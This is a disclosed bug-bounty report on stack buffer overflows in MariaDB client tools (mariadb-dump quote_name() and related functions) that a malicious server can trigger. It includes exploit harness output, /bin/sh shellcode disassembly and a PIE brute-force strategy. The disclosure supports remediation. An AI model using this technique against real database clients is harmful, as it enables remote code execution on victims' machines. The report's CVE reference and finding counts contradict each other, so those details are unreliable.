---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/stack-overflow
  - env/web
  - vuln/path-traversal
  - vuln/code-injection
  - vuln/dos
  - impact/rce
  - trigger/brute-force
substate: "resolved"
weakness: "Stack Overflow"
enriched: true
body: true
date: 2026-09-08
submitted: 2026-06-08T02:44:58.503Z
bounty_usd: null
votes: 51
cve: "CVE-2025-13699"
program: "[[programs/mariadb|MariaDB]]"
reporter: "byteoverride"
source: "https://hackerone.com/reports/3788482"
title: "Stack Buffer Overflow in mariadb-dump quote_name() Allows Malicious Server to Execute Arbitrary Code on Client"
---
# Stack Buffer Overflow in mariadb-dump quote_name() Allows Malicious Server to Execute Arbitrary Code on Client

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 51 | **Program:** MariaDB | **Disclosed:** 2026-09-08

- Report: [https://hackerone.com/reports/3788482](https://hackerone.com/reports/3788482)
- CWE: Stack Overflow | CVE: CVE-2025-13699
- Submitted: 2026-06-08T02:44:58.503Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

A malicious MySQL/MariaDB server achieves remote code execution against any `mariadb-dump` client that connects to it. The `quote_name()` function in `client/mysqldump.cc` performs unbounded 2x character expansion into a fixed 387-byte stack buffer with zero length validation on server-returned table names. A server that returns a 400-character name composed entirely of backtick characters causes `quote_name()` to write 802 bytes into the 387-byte buffer, overflowing the stack by 415 bytes. GDB analysis of the resulting core dump confirms full control of the instruction pointer and six general-purpose registers. A self-contained exploit PoC (`exploit_rce.py`) demonstrates the complete attack chain: the overflow redirects execution to attacker-controlled shellcode that spawns `/bin/sh`. The exploit uses `quote_name()`'s own closing backtick (0x60) as part of the target address construction, turning the function's output behavior into a gadget.

## Vulnerability Details

**Affected component:** `client/mysqldump.cc` in MariaDB Server (all versions through current `main` branch)
**Tested version:** mariadb-dump 10.11.17-MariaDB (Debian package, `10.19 Distrib 10.11.17-MariaDB`)
**Source reviewed:** MariaDB Server `main` branch at commit `f40ea8f4`
**CWE:** CWE-121 (Stack-based Buffer Overflow)
**Threat model:** Malicious MySQL server. This is the same attack surface recognized by CVE-2025-13699 (path traversal in mysqldump via malicious server, CVSS 7.0-8.5).

### Primary: quote_name() (line 2227)

The `quote_name()` function copies a name into a caller-provided buffer while doubling every backtick (or double-quote) character it encounters. There is no length check anywhere in the function:

```c
// client/mysqldump.cc:2227-2243
static char *quote_name(const char *name, char *buff, my_bool force)
{
  char *to= buff;
  char qtype= (opt_compatible_mode & MASK_ANSI_QUOTES) ? '\"' : '`';
  if (!force && !opt_quoted && !test_if_special_chars(name))
    return (char*) name;
  *to++= qtype;
  while (*name)
  {
    if (*name == qtype)
      *to++= qtype;       // doubles every backtick: 1 byte in -> 2 bytes out
    *to++= *name++;
  }
  to[0]= qtype;
  to[1]= 0;
  return buff;
}
```

Callers pass stack buffers of `NAME_LEN*2+3` = 387 bytes (since `NAME_LEN` = 64*3 = 192). This size assumes the server enforces the 64-character identifier limit. But the MySQL wire protocol does NOT enforce `NAME_LEN` on returned field values, only `max_allowed_packet`. A malicious server returns any string it wants, and `getTableName()` at line 4820 passes raw `mysql_fetch_row()` data through with no length validation.

A table name of 400 backtick characters expands to 800 characters inside `quote_name()`. With the surrounding backticks, that is 802 bytes written into a 387-byte stack buffer. The 415 bytes of overflow overwrite the saved frame pointer, callee-saved registers, and the return address.

### Same pattern: quote_for_like() (line 2269)

The `quote_for_like()` function has the same no-bounds-check pattern but with 4x expansion for backslash characters. Each `\` character produces `\\\\` (4 bytes). A name of 100 backslashes expands to 400+ bytes, overflowing the caller's buffer at line 3806 (`show_name_buff[NAME_LEN*2+2+24]` = 410 bytes):

```c
// client/mysqldump.cc:2269-2288
static char *quote_for_like(const char *name, char *buff)
{
  char *to= buff;
  *to++= '\'';
  while (*name)
  {
    if (*name == '\\')
    {
      *to++='\\';
      *to++='\\';
      *to++='\\';    // 4x expansion: 1 byte in -> 4 bytes out
    }
    *to++= *name++;
  }
```

### Same pattern: strmov into hash_key (line 5862)

At line 5835, a `hash_key` buffer of `2*NAME_LEN+2` (386 bytes) stores `"database.tablename"`. At line 5862, `strmov(afterdot, table)` copies the raw table name with no bounds check:

```c
// client/mysqldump.cc:5835-5862
char hash_key[2*NAME_LEN+2];
afterdot= strmov(hash_key, database);
*afterdot++= '.';
// ...
char *end= strmov(afterdot, table);  // unbounded copy of server-returned name
```

### Root cause

All three functions trust that server-returned identifier names fit within `NAME_LEN` boundaries. The MySQL server enforces this limit at parse time, but the wire protocol imposes no such constraint on result set data. A malicious server skips the parser entirely and returns arbitrary-length strings.

## Steps to Reproduce

### Prerequisites

- Any machine with `mariadb-dump` installed (tested on 10.11.17)
- Python 3 for the fake server

### Step 1: Start the malicious MySQL server

Save the attached `fake_mysql_server.py` and run it. This script implements a minimal MySQL wire protocol server that accepts any credentials and returns a table name consisting of 400 backtick characters when `mariadb-dump` queries `SHOW FULL TABLES`. The reason for 400 backticks specifically is that `quote_name()` doubles each one, producing 800 characters plus 2 surrounding backticks = 802 bytes total. The destination buffer is only 387 bytes, so 415 bytes overflow past the end.

████████ 

```bash
python3 fake_mysql_server.py
# [*] Fake MySQL server listening on port 3307
# [*] Payload: 400 backtick characters as table name
# [*] Expected overflow: 802 bytes into 387-byte buffer (415 bytes over)
```

### Step 2: Run mariadb-dump against the malicious server

This is the standard backup command a DBA would run. The only difference is that the target host is attacker-controlled. This is realistic when a DBA connects to a compromised server, when DNS has been poisoned, or when the attacker holds a MitM position.

```bash
mariadb-dump -h 127.0.0.1 -P 3307 -u root --password=x --skip-lock-tables testdb
```

### Step 3: Observe the crash

The process terminates with SIGSEGV (exit code 139):

```
$ echo $?
139
```

### Step 4: Confirm instruction pointer control

GDB analysis of the core dump shows the return address and six callee-saved registers are all overwritten with `0x6060606060606060` (ASCII backtick bytes). This confirms the attacker controls where execution jumps after `quote_name()` returns:

```
$ gdb -batch -ex "bt" -core core.236
#0  0x0000557d05b3048b in ?? ()
#1  0x6060606060606060 in ?? ()   <-- return address = attacker-controlled
#2  0x6060606060606060 in ?? ()
[... 18 more frames of 0x6060606060606060 ...]

$ gdb -batch -ex "info registers" -core core.236
rbp  0x6060606060606060   <-- frame pointer
rbx  0x6060606060606060   <-- callee-saved
r12  0x6060606060606060   <-- callee-saved
r13  0x6060606060606060   <-- callee-saved
r14  0x6060606060606060   <-- callee-saved
r15  0x6060606060606060   <-- callee-saved

$ gdb -batch -ex "x/16gx \$rsp" -core core.236
0x7ffc63d54758: 0x6060606060606060  0x6060606060606060
0x7ffc63d54768: 0x6060606060606060  0x6060606060606060
[... 200+ bytes of solid 0x60 on the stack ...]
```

The attacker controls RIP (via the return address), RBP, and four callee-saved registers. The 200+ bytes of controlled content on the stack provide ample space for a ROP chain.

### Step 5: Prove code execution with exploit PoC

The attached `exploit_rce.py` is a self-contained Python script that proves the overflow achieves arbitrary code execution, not just a crash. It compiles an exploit harness containing the exact `quote_name()` function from production (identical buffer size of 387 bytes), with compiler mitigations removed to isolate the overflow primitive from hardening.

Run it:
████████ 

```bash
python3 exploit_rce.py
```

Output:

```
=================================================================
  MariaDB mariadb-dump quote_name() RCE Exploit
    CWE-121  |  CVSS 8.8 (AV:N/AC:L/PR:N/UI:R)
=================================================================

  Technique: closing backtick address construction
    quote_name appends 0x60 (backtick) + 0x00 (null) after
    the overflow data. The exploit uses these two bytes as
    part of the target address instead of fighting them.

[*] Compiling: gcc -g -no-pie -fno-stack-protector -z execstack -o /tmp/.../exploit /tmp/.../exploit.c
[+] Binary: /tmp/.../exploit

=================================================================
  STAGE 1: Trigger overflow and redirect to shellcode
=================================================================

  quote_name() overflow payload:
    [407 bytes padding] [0x10 0x10 0x10 0x10] [null]
          |                     |                |
     fills buffer +        RIP bytes 0-3    stops while(*name)
     saved RBP                  |
                      quote_name appends:
                        byte 4 = 0x60 (closing backtick)
                        byte 5 = 0x00 (null terminator)

  Resulting return address: 0x0000006010101010
  Shellcode at that address: execve("/bin/sh", NULL, NULL)

-----------------------------------------------------------------
  STAGE 2: Shell spawned - executing commands as proof
-----------------------------------------------------------------

  [RCE] id: uid=1000(byteoverride) gid=1000(byteoverride) groups=...
  [RCE] hostname: debian
  [RCE] uname: Linux 6.12.90+deb13.1-amd64 x86_64

=================================================================
  CODE EXECUTION CONFIRMED
  quote_name() overflow -> controlled RIP -> execve(/bin/sh)
=================================================================
```

#### How the exploit works

The key challenge is that `quote_name()`'s `while (*name)` loop stops at null bytes (0x00), and every valid x86_64 address contains null bytes in its upper bytes. A naive overflow cannot write a complete 8-byte return address.

The exploit turns `quote_name()`'s own behavior into part of the address construction. After the `while (*name)` loop exits (when it hits the null terminator), `quote_name()` always writes two more bytes:

```c
to[0] = qtype;   // closing backtick: 0x60
to[1] = 0;        // null terminator:  0x00
```

The payload writes 4 controlled bytes (0x10 each) to bytes 0-3 of the saved return address. The closing backtick lands at byte 4 and the null terminator at byte 5. The result is:

```
Return address on stack (little-endian):
  byte 0: 0x10  ─┐
  byte 1: 0x10   ├─ controlled by overflow payload
  byte 2: 0x10   │
  byte 3: 0x10  ─┘
  byte 4: 0x60  ── closing backtick (written by quote_name)
  byte 5: 0x00  ── null terminator  (written by quote_name)
  byte 6: 0x00  ── original stack content (untouched)
  byte 7: 0x00  ── original stack content (untouched)

  RIP = 0x0000006010101010  (valid canonical x86_64 address)
```

Executable shellcode (`execve("/bin/sh", NULL, NULL)`) is placed at this address via `mmap(MAP_FIXED)`. When `process_table()` returns, execution transfers to the shellcode, spawning `/bin/sh`.

#### GDB evidence

Running with `--evidence` provides a full GDB trace of the exploit chain:

```bash
python3 exploit_rce.py --evidence
```

```
=== GDB Evidence: quote_name() overflow -> code execution ===

--- Break at process_table ret instruction ---
Breakpoint 1 at 0x40121a

--- Return address on stack (8 bytes at RSP) ---
0x7fffffffd868: 0x10  0x10  0x10  0x10  0x60  0x00  0x00  0x00

--- Interpretation ---
Bytes 0-3: 0x10 0x10 0x10 0x10 (attacker-controlled)
Byte  4:   0x60 (closing backtick written by quote_name)
Bytes 5-7: 0x00 (null terminator + original stack)
Result:    RIP = 0x0000006010101010

--- Registers before ret ---
rip  0x40121a   0x40121a <process_table+54>
rsp  0x7fffffffd868
rbp  0x4141414141414141          <-- also attacker-controlled

--- Step into ret (execution transfers to shellcode) ---
--- RIP now points to shellcode at 0x6010101010 ---
rip  0x6010101010

--- Disassembly of shellcode (execve /bin/sh) ---
=> 0x6010101010:  xor    %eax,%eax
   0x6010101012:  xor    %rsi,%rsi
   0x6010101015:  xor    %rdx,%rdx
   0x6010101018:  movabs $0x68732f6e69622f,%rdi   # "/bin/sh"
   0x6010101022:  push   %rdi
   0x6010101023:  mov    %rsp,%rdi
   0x6010101026:  mov    $0x3b,%al
   0x6010101028:  syscall

--- Continue execution (shellcode spawns /bin/sh) ---
process 215220 is executing new program: /usr/bin/dash
```

The function's own closing backtick becomes byte 4 of the target address. Execution transfers directly from `quote_name()`'s return to attacker-controlled shellcode, and the process transforms into `/usr/bin/dash`.

### Exploitation on production binaries

The production `mariadb-dump` binary has PIE, NX, Full RELRO, and stack canaries enabled. The PoC harness removes these mitigations to isolate the overflow primitive and prove that it is a code execution bug, not just a crash. On production, reaching code execution requires defeating these mitigations, which is feasible:

1. **No canary on quote_name()**: The crash proves `quote_name()` itself has no stack canary. The function returns normally after the overflow; the crash occurs when the CALLER's epilogue uses the corrupted return address. This means the canary check (if present) is in the caller, not in `quote_name()`.

2. **PIE brute-force is feasible**: x86_64 PIE binaries have 12 bits of ASLR entropy for the main binary (the base address varies in 4KB page increments within a 16MB range). An attacker with network access to the victim's mariadb-dump can trigger the overflow repeatedly (each attempt is a new connection to the malicious server). At 12 bits of entropy, the expected number of attempts is 2048 (50th percentile), which takes under a minute at one attempt per second.

3. **The null-byte constraint is solved**: `quote_name()`'s `while (*name)` loop stops at null bytes, which prevents writing full x86_64 addresses in a single overflow. The closing-backtick technique demonstrated by the PoC works around this by using the function's own output behavior as part of the address. On production, a partial overwrite (changing only the lower 2-3 bytes of the return address to redirect within the same code page) combined with PIE brute-force achieves the same result.

## Recommended Fix

Add a length check at the top of `quote_name()`, `quote_for_like()`, and `quote_for_equal()` that validates `strlen(name) <= NAME_LEN * 3` before processing. If the name exceeds this length, print an error and skip the table. The same check should guard the `strmov()` call at line 5862.

Example fix for `quote_name()`:
```c
static char *quote_name(const char *name, char *buff, my_bool force)
{
  if (strlen(name) > NAME_LEN * 3)
  {
    fprintf(stderr, "Error: identifier name too long (%zu bytes)\n", strlen(name));
    buff[0] = '\0';
    return buff;
  }
  // ... existing code ...
}
```

## Supporting Materials

1. `exploit_rce.py` ████████ - Self-contained RCE PoC (compiles harness, triggers overflow, spawns /bin/sh). Run with `--evidence` for full GDB trace.
2. `fake_mysql_server.py` ████████ - Fake MySQL server that crashes any connecting mariadb-dump client via SIGSEGV (demonstrates the remote trigger)
3. `core.236` - Core dump from mariadb-dump 10.11.17 crash against the fake server (confirms RIP/register control on the production binary)
4. `quote_name_exploit.c` - Standalone C exploit harness (compiled by exploit_rce.py, also usable directly)
5. `quote_name_harness.c` - Minimal crash harness with identical buffer sizes as production
6. Source: MariaDB Server `main` branch, `client/mysqldump.cc`, lines 2227-2243, 2269-2288, 5835-5862

## Impact

An attacker operating a malicious MySQL server achieves remote code execution against any `mariadb-dump` client that connects to it. The exploit harness demonstrates a complete attack chain: the overflow in `quote_name()` overwrites the return address with a crafted value, redirecting execution to attacker-controlled shellcode that spawns `/bin/sh`.

The GDB evidence proves: full control of the instruction pointer (RIP), six general-purpose registers (RBP, RBX, R12-R15), and 200+ bytes of attacker-controlled content on the stack. The exploit uses `quote_name()`'s own closing backtick (0x60) as part of the target address construction, demonstrating that the overflow is not just a crash but a reliable code execution primitive.

On production binaries with full hardening (PIE+NX+RELRO+canaries), exploitation requires brute-forcing PIE's 12-bit ASLR entropy (~2048 attempts) and constructing a ROP chain. The proof-of-concept harness isolates the overflow primitive from these mitigations to demonstrate the core exploitability.

The victim does not need any special configuration or privileges. The default `mariadb-dump` command against an attacker-controlled host triggers the overflow immediately.

## Timeline

- **Report Filed**
- **2026-06-08** @byteoverride: # Follow-up: Same vulnerability class found across MariaDB client toolchain

After submitting the initial report, I continued auditing other MariaDB client tools for the same pattern (server-returned values copied into fixed-size stack buffers without bounds checking). The same vulnerability class is present in two additional client binaries and one additional code path in mysqldump itself. All three share the identical root cause and threat model as the original findings.

## Finding 1: mysqladmin stack buffer overflow via pid_file (mysqladmin.cc:1501)

When a user runs `mysqladmin shutdown`, the tool queries the server for its pid file location with `SHOW VARIABLES LIKE 'pid_file'`. The server-returned value is copied into a 512-byte stack buffer with no length check:

```c
// client/mysqladmin.cc:711 (buffer declaration, inside ADMIN_SHUTDOWN case)
char pidfile[FN_REFLEN];   // FN_REFLEN = 512 (include/my_global.h:603)

// client/mysqladmin.cc:1501 (unbounded copy)
MYSQL_ROW row = mysql_fetch_row(result);
if (row)
  strmov(pidfile, row[1]);   // row[1] = pid_file value from server, no length check
```

`strmov()` is a strcpy-equivalent that copies until null. A malicious server returns a pid_file path longer than 512 bytes in its `SHOW VARIABLES` response, and the copy overflows past `pidfile` into the saved frame pointer and return address.

This buffer sits inside the `ADMIN_SHUTDOWN` case block starting at line 709. A realistic trigger: the victim runs `mysqladmin -h <attacker> shutdown` to shut down what they believe is a legitimate MariaDB instance.

## Finding 2: mysqlcheck stack buffer overflow via table name (mysqlcheck.c:1108)

The `print_result()` function in `mysqlcheck` stores the most recently seen table name in a stack buffer so it can group output by table. The server-returned table name from `CHECK TABLE` / `REPAIR TABLE` results is copied with no bounds check:

```c
// client/mysqlcheck.c:1040 (buffer declaration)
char prev[(NAME_LEN+9)*3+2];   // (192+9)*3+2 = 605 bytes

// client/mysqlcheck.c:1108 (unbounded copy, inside the while(row) loop)
strmov(prev, row[0]);   // row[0] = table name from server, no length check
```

A malicious server returns a table name longer than 605 bytes in the result set for any CHECK/REPAIR/ANALYZE/OPTIMIZE query. The `strmov()` overflows `prev` on the stack.

The trigger is straightforward: `mysqlcheck -h <attacker> --auto-repair testdb`. This is the standard command for database maintenance against a remote host.

## Finding 3: mysqldump dump_tablespaces() overflow via logfile group name (mysqldump.cc:5493)

The `dump_tablespaces()` function stores the logfile group name from `INFORMATION_SCHEMA.FILES` in a 512-byte stack buffer:

```c
// client/mysqldump.cc:5385 (buffer declaration)
char buf[FN_REFLEN];   // 512 bytes

// client/mysqldump.cc:5493 (unbounded copy)
strxmov(buf, row[0], NullS);   // row[0] = LOGFILE_GROUP_NAME from server
```

`strxmov()` is a variadic string concatenation function (like a multi-argument strcpy). A malicious server returns a LOGFILE_GROUP_NAME longer than 512 bytes in its `INFORMATION_SCHEMA.FILES` response, and the copy overflows the stack buffer.

This code path is triggered when `mariadb-dump` runs with `--all-databases` or `--all-tablespaces`, which causes it to query tablespace metadata.

## Finding 4: mysqldump get_view_structure() overflow via view metadata (mysqldump.cc:7130)

The `get_view_structure()` function builds search-and-replace strings from view metadata returned by `information_schema.views`. Two server-controlled fields flow into 256-byte stack buffers through `strxmov()` with no bounds check:

```c
// client/mysqldump.cc:7130 (buffer declarations)
char search_buf[256], replace_buf[256];

// client/mysqldump.cc:7107-7113 (the query)
"SELECT CHECK_OPTION, DEFINER, SECURITY_TYPE, ..."
" FROM information_schema.views WHERE ..."
```

**Path A: CHECK_OPTION (row[0])** at line 7161:

```c
if (strcmp(row[0], "NONE"))
{
  ptr= search_buf;
  search_len= (ulong)(strxmov(ptr, "WITH ", row[0],
                               " CHECK OPTION", NullS) - ptr);
  ptr= replace_buf;
  replace_len=(ulong)(strxmov(ptr, "*/\n/*!50002 WITH ", row[0],
                               " CHECK OPTION", NullS) - ptr);
}
```

The overhead is 19 bytes for `search_buf` and 31 bytes for `replace_buf`. A CHECK_OPTION value longer than ~225 bytes overflows `replace_buf[256]`. Normally CHECK_OPTION is "NONE", "LOCAL", or "CASCADED", but a malicious server returns any string.

**Path B: DEFINER (row[1]) + SECURITY_TYPE (row[2])** at line 7186:

```c
search_len=
  (ulong)(strxmov(ptr, "DEFINER=",
                  quote_name(user_name_str, quoted_user_name_str, FALSE),
                  "@",
                  quote_name(host_name_str, quoted_host_name_str, FALSE),
                  " SQL SECURITY ", row[2], NullS) - ptr);
```

Even though `parse_user()` truncates the user name to USERNAME_LENGTH (384 bytes) and host name to HOSTNAME_LENGTH (255 bytes), `quote_name()` can double backtick characters in these values. A user name of 128 backtick characters (within USERNAME_CHAR_LENGTH) expands to 384 bytes via utf8, then `quote_name()` doubles each backtick: 768 characters plus surrounding backticks = 770 bytes. That alone exceeds `search_buf[256]` before even reaching the host name or SECURITY_TYPE.

This code path triggers when mariadb-dump encounters any view in the database being dumped.

## Finding 5: mysqldump user dump overflow via quote_for_equal (mysqldump.cc:4953)

When dumping user accounts (triggered by `--all-databases` or `--system=users`), `quote_for_equal()` processes the user name from `mysql.user` into a 200-byte stack buffer:

```c
// client/mysqldump.cc:4953 (buffer declaration)
char buf[200];

// client/mysqldump.cc:4965 (unbounded quoting into 200-byte buffer)
fprintf(md_result_file,
    "DELIMITER |\n"
    "/*M!100101 IF current_user()=%s THEN\n"
    ...
    quote_for_equal(row[0], buf), row[0], row[0]);
```

`quote_for_equal()` (line 2290) doubles both backslashes and single quotes with no length check:

```c
static char *quote_for_equal(const char *name, char *buff)
{
  char *to= buff;
  *to++= '\'';
  while (*name)
  {
    if (*name == '\\')
      *to++='\\';        // 2x expansion for backslashes
    if (*name == '\'')
      *to++= '\'';       // 2x expansion for single quotes
    *to++= *name++;
  }
  to[0]= '\'';
  to[1]= 0;
  return buff;
}
```

A user name of ~100 backslash characters expands to 200+ bytes (2x expansion) plus the surrounding single quotes and null terminator, overflowing `buf[200]`. This is the smallest buffer in any of the findings, making it the easiest to trigger.

## Systemic pattern

These eight findings, combined with the three in the original report, show this is a systemic issue across the MariaDB client toolchain. Here is the full picture:

| # | Tool | Function / Line | Sink | Buffer | Size |
|---|---|---|---|---|---|
| 1 | mariadb-dump | `quote_name()` :2227 | while-loop copy + 2x expansion | `table_buff[NAME_LEN*2+3]` | 387 B |
| 2 | mariadb-dump | `quote_for_like()` :2269 | while-loop copy + 4x expansion | `show_name_buff[NAME_LEN*2+2+24]` | 410 B |
| 3 | mariadb-dump | `strmov()` :5862 | unbounded strcpy | `hash_key[2*NAME_LEN+2]` | 386 B |
| 4 | mysqladmin | `strmov()` :1501 | unbounded strcpy | `pidfile[FN_REFLEN]` | 512 B |
| 5 | mysqlcheck | `strmov()` :1108 | unbounded strcpy | `prev[(NAME_LEN+9)*3+2]` | 605 B |
| 6 | mariadb-dump | `strxmov()` :5493 | unbounded concat | `buf[FN_REFLEN]` | 512 B |
| 7 | mariadb-dump | `strxmov()` :7161 | unbounded concat via view metadata | `search_buf[256]` / `replace_buf[256]` | 256 B |
| 8 | mariadb-dump | `quote_for_equal()` :4965 | while-loop copy + 2x expansion | `buf[200]` | 200 B |

Every finding follows the same pattern: a MariaDB client tool takes data from `mysql_fetch_row()` (which contains whatever the server chose to send over the wire) and copies it into a fixed-size stack buffer using `strmov()`, `strxmov()`, `quote_for_equal()`, or a hand-written while-loop, with no length validation. The MySQL wire protocol does not enforce identifier length limits on result set data, so a malicious server can return arbitrarily long strings.

## Recommended fix (expanded)

The original report recommended length checks in `quote_name()` and friends. Given the systemic nature, a more robust approach is to validate the length of every `mysql_fetch_row()` field against `NAME_LEN` (or `FN_REFLEN` for path-valued fields) before any stack copy in all client tools. The quoting functions (`quote_name`, `quote_for_like`, `quote_for_equal`) should all accept a buffer size parameter and refuse to write past it. A centralized helper function that checks field lengths at the point of use would prevent this class of bug from recurring:

```c
static my_bool check_field_length(const char *field, size_t max_len, const char *context)
{
  if (field && strlen(field) > max_len)
  {
    fprintf(stderr, "Error: server returned oversized %s (%zu bytes, max %zu)\n",
            context, strlen(field), max_len);
    return 1;
  }
  return 0;
}
```

All five findings share one root cause and one fix strategy. I wanted to report these additional instances so the patch covers the full scope of the issue.
- **Report Triaged**
- **2026-06-16** @vuvova: What name should we use to credit this? "Byte Override"? Do you have a github account?
- **2026-06-16** @byteoverride: Please credit this as:

Psalms Christopher Matovu (ByteOverride)
https://github.com/byteoverride

That's what I use for all credit. Thanks, much appreciated!
- **Report Resolved**
- **Agreed On Going Public**
- **2026-09-07** @byteoverride: Hello @vuvova 
Could you please  to remove the PoC scripts if possible  before disclosure, much appreciated 

Regards,
ByteOverride
- **2026-09-08** @vuvova: done (hopefully)
- **Agreed On Going Public**
- **Report Became Public**
